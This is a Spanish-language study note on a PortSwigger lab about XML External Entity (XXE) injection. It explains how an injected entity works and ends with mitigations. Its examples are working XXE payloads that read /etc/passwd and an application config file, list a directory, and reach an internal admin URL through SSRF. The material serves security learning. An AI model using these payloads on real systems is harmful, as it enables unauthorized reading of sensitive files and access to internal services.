

---

# Exploiting XXE Using External Entities to Retrieve Files

Este apunte explica cómo funciona una vulnerabilidad XXE (XML External Entity) y cómo explotarla para leer archivos en un sistema vulnerable. Además, responde a preguntas clave sobre su funcionamiento, basándose en el laboratorio "Exploiting XXE using external entities to retrieve files" de PortSwigger.

---

## 1. ¿Qué es el XXE?

La vulnerabilidad de **XML External Entity (XXE)** ocurre cuando una aplicación que procesa XML permite la inclusión de entidades externas (external entities). Estas entidades pueden ser usadas para:

- Leer archivos del sistema donde se ejecuta la aplicación.
- Realizar conexiones a servidores internos.
- Llevar a cabo ataques DoS.
![[Pasted image 20250127225901.png]]
---

## 2. Inyección de una Entidad Externa

Para explotar esta vulnerabilidad, se puede inyectar una entidad externa en el XML. Un ejemplo básico de inyección sería:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```

### Desglose del código:

- **`<!DOCTYPE foo [...]>`**: Define el tipo de documento y permite declarar entidades externas.
- **`<!ENTITY xxe SYSTEM "file:///etc/passwd">`**: Declara una entidad llamada `xxe` que apunta al archivo `/etc/passwd`.
- **`&xxe;`**: Inserta la entidad definida (contenido del archivo) dentro del XML.

Cuando el servidor interpreta este XML:

1. **Interpreta la entidad `&xxe;`** y la reemplaza por el contenido del archivo `/etc/passwd`.
2. Devuelve la respuesta con los datos del archivo.

---

## 3. Respuestas a Preguntas Frecuentes

### 3.1 ¿Por qué usar `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`?

Esta línea define un **DOCTYPE** con una entidad externa. La vulnerabilidad aprovecha que el parser XML del servidor permite definir y procesar entidades externas. En este caso:

- `foo` es el nombre del tipo de documento (puede ser cualquier palabra).
- `xxe` es el nombre de la entidad externa.
- `SYSTEM` indica que la entidad apunta a un recurso externo (en este caso, un archivo).

**Sin esta línea, el XML no tendría una entidad externa para inyectar.**

### 3.2 ¿Por qué no funciona si pongo texto antes de `&xxe;`?

El problema ocurre porque:

- **El parser XML reemplaza `&xxe;` por el contenido de la entidad externa.**
- Si se combina texto directamente con la entidad (`Texto&xxe;`), el parser no lo interpreta como una referencia válida a la entidad externa, y el XML es rechazado.

Para evitar errores, usa `&xxe;` en solitario o separado por etiquetas XML:

```xml
<productId>&xxe;</productId>
```

Esto asegura que el parser lo interprete correctamente.

### 3.3 ¿Siempre hay que apuntar a `&xxe;`?

Sí, porque `&xxe;` es el nombre de la entidad que tú definiste en el **DOCTYPE**. Si la llamaras de otra forma, como `evil`, entonces tendrías que usar:

```xml
<!DOCTYPE foo [ <!ENTITY evil SYSTEM "file:///etc/passwd"> ]>
...
<productId>&evil;</productId>
```

El nombre que elijas para la entidad debe coincidir con el que uses en el XML.

---

## 4. Ejemplos Prácticos

### 4.1 Recuperando otros archivos

El archivo `/etc/passwd` es un ejemplo común. Pero podrías intentar acceder a otros archivos:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/config.php"> ]>
...
<productId>&xxe;</productId>
```

Esto podría permitirte leer configuraciones sensibles de la aplicación web.

### 4.2 Enumeración de Directorios

Puedes usar entidades externas para leer listas de directorios:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/"> ]>
...
<productId>&xxe;</productId>
```

Esto puede revelar nombres de archivos y directorios interesantes.

### 4.3 Ataques SSRF (Server-Side Request Forgery)

En lugar de apuntar a un archivo, puedes apuntar a una URL para interactuar con servicios internos:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]>
...
<productId>&xxe;</productId>
```

Esto puede permitirte interactuar con servicios internos o APIs privadas.

---

## 5. Mitigaciones

Para prevenir esta vulnerabilidad, los desarrolladores deben:

1. **Deshabilitar las entidades externas** al procesar XML.
    - En Python con lxml:
        
        ```python
        parser = etree.XMLParser(resolve_entities=False)
        ```
        
2. **Usar bibliotecas seguras** para el procesamiento de XML.
3. **Validar y sanitizar la entrada de datos**.

---
Document Type Definition 
